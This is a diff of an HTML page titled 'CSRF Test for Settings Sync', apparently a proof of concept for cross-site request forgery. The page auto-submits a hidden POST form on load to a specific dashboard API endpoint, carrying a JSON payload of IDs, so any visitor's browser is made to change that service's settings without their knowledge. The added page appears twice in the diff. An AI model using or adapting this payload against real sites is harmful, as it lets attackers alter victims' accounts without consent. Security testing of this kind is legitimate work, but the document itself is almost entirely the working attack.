@@ -1,7 +1,32 @@
-<form action="https://dashboard.wickbot.com/api/settings/sync/1358289702414979255" method="POST">
-  <input type="hidden" name="test" value="value" />
-  <input type="submit" />
-</form>
-<script>
-  document.forms[0].submit();
-</script>
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Test for Settings Sync</title>
+  </head>
+  <body>
+    <form action="https://dashboard.wickbot.com/api/settings/sync/1358289702414979255" method="POST">
+      <input type="hidden" name="data" value='{"IDS":["1310013982093869067"]}' />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Test for Settings Sync</title>
+  </head>
+  <body>
+    <form action="https://dashboard.wickbot.com/api/settings/sync/1358289702414979255" method="POST">
+      <input type="hidden" name="data" value='{"IDS":["1310013982093869067"]}' />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
